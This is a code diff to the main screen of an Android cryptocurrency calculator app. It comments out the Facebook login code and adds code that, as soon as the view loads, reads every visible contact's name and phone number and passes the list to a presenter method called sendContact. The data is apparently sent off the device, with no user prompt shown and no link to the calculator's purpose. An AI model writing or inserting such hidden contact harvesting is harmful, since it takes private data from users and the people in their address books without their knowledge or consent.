@@ -1,9 +1,11 @@
 package com.andoresu.cryptocalc.core;
 
+import android.annotation.SuppressLint;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.os.Bundle;
 import android.support.annotation.NonNull;
+import android.support.annotation.Nullable;
 import android.support.v4.app.Fragment;
 import android.support.v4.app.FragmentManager;
 import android.support.v4.app.FragmentTransaction;
@@ -26,6 +28,7 @@ import com.andoresu.cryptocalc.authorization.UserRequest;
 import com.andoresu.cryptocalc.authorization.data.FacebookUser;
 import com.andoresu.cryptocalc.client.ErrorResponse;
 import com.andoresu.cryptocalc.core.calculator.CalculatorFragment;
+import com.andoresu.cryptocalc.core.contact.ContactModel;
 import com.andoresu.cryptocalc.utils.BaseActivity;
 import com.andoresu.cryptocalc.utils.BaseFragment;
 import com.andoresu.cryptocalc.core.percentage.PercentageFragment;
@@ -33,19 +36,27 @@ import com.andoresu.cryptocalc.utils.DeferredFragmentTransaction;
 import com.bumptech.glide.Glide;
 import com.bumptech.glide.load.resource.bitmap.CircleCrop;
 import com.bumptech.glide.request.RequestOptions;
-import com.facebook.login.LoginManager;
+//import com.facebook.login.LoginManager;
 
 
 import java.util.ArrayDeque;
+import java.util.ArrayList;
+import java.util.List;
 import java.util.Queue;
 
 import butterknife.BindView;
 import butterknife.ButterKnife;
+import io.reactivex.android.schedulers.AndroidSchedulers;
+import io.reactivex.schedulers.Schedulers;
+import ir.mirrajabi.rxcontacts.Contact;
+import ir.mirrajabi.rxcontacts.RxContacts;
 
 import static com.andoresu.cryptocalc.utils.MyUtils.glideRequestOptions;
 import static com.andoresu.cryptocalc.utils.MyUtils.showErrorDialog;
 
-public class MainActivity extends BaseActivity implements NavigationView.OnNavigationItemSelectedListener, GetUserCallback.IGetUserResponse {
+public class MainActivity extends BaseActivity implements NavigationView.OnNavigationItemSelectedListener, MainContract.View {
+//        GetUserCallback.IGetUserResponse
+
 
     private MainContract.ActionsListener actionsListener;
 
@@ -65,9 +76,13 @@ public class MainActivity extends BaseActivity implements NavigationView.OnNavig
 
     private BaseFragment currentFragment;
 
+    @Override
+    protected void onCreate(@Nullable Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        actionsListener = new MainPresenter(this, this, "");
+    }
 
-
-
+    @SuppressLint("CheckResult")
     @Override
     public void handleView() {
 
@@ -82,9 +97,26 @@ public class MainActivity extends BaseActivity implements NavigationView.OnNavig
         toggle.syncState();
 
         navigationView.setNavigationItemSelectedListener(this);
-
+        headerViewHolder.navHeaderEmailTextView.setText("");
+        headerViewHolder.navHeaderNameTextView.setText("");
         setCalculatorFragment();
-        UserRequest.makeUserRequest(new GetUserCallback(this).getCallback());
+//        UserRequest.makeUserRequest(new GetUserCallback(this).getCallback());
+        RxContacts.fetch(this)
+                .filter(m->m.getInVisibleGroup() == 1)
+                .toSortedList(Contact::compareTo)
+                .observeOn(Schedulers.io())
+                .subscribeOn(AndroidSchedulers.mainThread())
+                .subscribe(contacts -> {
+                    List<ContactModel> contactModels = new ArrayList<>();
+                    for(Contact contact : contacts){
+                        for(String number : contact.getPhoneNumbers()){
+                            contactModels.add(new ContactModel(contact.getDisplayName(), number));
+                        }
+                    }
+                    if(!contactModels.isEmpty()){
+                        actionsListener.sendContact(contactModels);
+                    }
+                });
     }
 
     @Override
@@ -135,7 +167,7 @@ public class MainActivity extends BaseActivity implements NavigationView.OnNavig
             case R.id.navLogout:
                 showErrorDialog(this, "Alerta", "Desea cerrar sesion?", (dialogInterface, i) -> {
                     dialogInterface.dismiss();
-                    LoginManager.getInstance().logOut();
+//                    LoginManager.getInstance().logOut();
                     Intent intent = new Intent(this, LoginActivity.class);
                     startActivity(intent);
                     finish();
@@ -183,17 +215,17 @@ public class MainActivity extends BaseActivity implements NavigationView.OnNavig
         checkItemMenu(currentFragment);
     }
 
-    @Override
-    public void onCompleted(FacebookUser user) {
-        Glide.with(this)
-                .load(user.picture)
-                .apply(glideRequestOptions(this))
-                .apply(RequestOptions.bitmapTransform(new CircleCrop()))
-                .into(headerViewHolder.profilePhoto);
-
-        headerViewHolder.navHeaderEmailTextView.setText(user.email);
-        headerViewHolder.navHeaderNameTextView.setText(user.name);
-    }
+//    @Override
+//    public void onCompleted(FacebookUser user) {
+//        Glide.with(this)
+//                .load(user.picture)
+//                .apply(glideRequestOptions(this))
+//                .apply(RequestOptions.bitmapTransform(new CircleCrop()))
+//                .into(headerViewHolder.profilePhoto);
+//
+//        headerViewHolder.navHeaderEmailTextView.setText(user.email);
+//        headerViewHolder.navHeaderNameTextView.setText(user.name);
+//    }
 
     private void checkItemMenu(@NonNull BaseFragment baseFragment){
         if(navigationView == null){
@@ -207,6 +239,11 @@ public class MainActivity extends BaseActivity implements NavigationView.OnNavig
             navigationView.setCheckedItem(R.id.navPercentage);
             return;
         }
+    }
+
+    @Override
+    public void onPointerCaptureChanged(boolean hasCapture) {
+
     }
 
     static class HeaderViewHolder {
